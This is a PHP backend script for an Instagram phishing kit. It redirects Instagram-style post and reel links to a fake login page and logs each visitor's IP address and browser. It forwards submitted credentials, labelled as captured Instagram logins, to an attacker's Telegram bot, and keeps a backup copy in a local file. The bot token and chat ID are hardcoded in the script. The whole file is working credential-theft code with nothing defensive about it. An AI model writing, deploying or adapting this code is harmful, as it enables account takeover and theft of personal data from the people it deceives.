<?php

// Load environment variables from .env file if it exists
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Get configuration from environment variables
$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
$log_file = getenv('LOG_FILE') ?: "credentials_log.txt";
$enable_backup_logging = getenv('ENABLE_BACKUP_LOGGING') !== 'false';

// Get the request URI
$request_uri = $_SERVER['REQUEST_URI'];
$path = parse_url($request_uri, PHP_URL_PATH);

// Route handling
if ($path === '/' || $path === '/index.php') {
    // Redirect to login page
    header('Location: login.html');
    exit;
}

// Handle Instagram-like URLs: /p/xxx, /reel/xxx, /tv/xxx
if (preg_match('#^/(p|reel|tv)/([a-zA-Z0-9_-]+)/?$#', $path, $matches)) {
    // Log the click
    $log_file = "clicks_log.txt";
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $type = $matches[1];
    $video_id = $matches[2];
    
    $log_entry = "[{$timestamp}] Type: {$type} | ID: {$video_id} | IP: {$ip} | UA: {$user_agent}\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Redirect to fake login
    header('Location: login.html');
    exit;
}

if(isset($_POST["data"])) {
    $credentials = $_POST["data"];
    
    // Format message for Telegram
    $message = "🔔 New Instagram Credentials Captured:\n\n" . strip_tags($credentials);
    
    // Send to Telegram
    $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
    
    $post_fields = array(
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Optional: Log to file as backup
    if ($enable_backup_logging) {
        $log_entry = date("Y-m-d H:i:s") . " - " . $credentials . " [HTTP: " . $http_code . "]\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);
    }
    
    echo ($http_code == 200) ? "Success" : "Failed";
} else {
    echo "No data received";
}

?>

